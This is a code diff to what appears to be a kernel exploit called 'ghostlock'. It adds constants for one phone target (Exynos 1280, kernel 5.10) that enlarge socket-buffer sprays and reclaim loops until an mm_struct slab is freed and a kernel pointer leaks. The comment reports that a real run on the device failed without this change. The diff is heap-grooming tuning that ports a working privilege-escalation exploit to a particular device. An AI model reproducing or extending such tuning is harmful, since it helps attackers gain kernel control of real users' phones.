@@ -27,8 +27,22 @@ namespace ghostlock::kernel {
     inline constexpr unsigned MM_PARTIALS = 5;
 
     inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
+
+#if defined(GHOSTLOCK_TARGET_A53_5_10)
+    /* Exynos 1280 only reclaims the mm_struct slab once the socket buffer
+     * spans enough order-3 slabs to cover it, and the reclaim loop has to run
+     * that many times. Upstream measured 256 slabs / 256 sends on this SoC.
+     *
+     * With the generic 2-slab / 4-send values the slab is never freed, so the
+     * mm_struct scan has nothing to match and every heap-preparation attempt
+     * fails with "mm_struct leaked=0xffffffffffffffff" -- which is what a real
+     * run on this device did before this branch existed. */
+    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 256;
+    inline constexpr unsigned long SKB_RECLAIM_SENDS = 256;
+#else
     inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
-    inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
+    inline constexpr unsigned long SKB_RECLAIM_SENDS = 4;
+#endif
     inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
     inline constexpr int32_t SKB_FRAG_BIAS = 0;
 
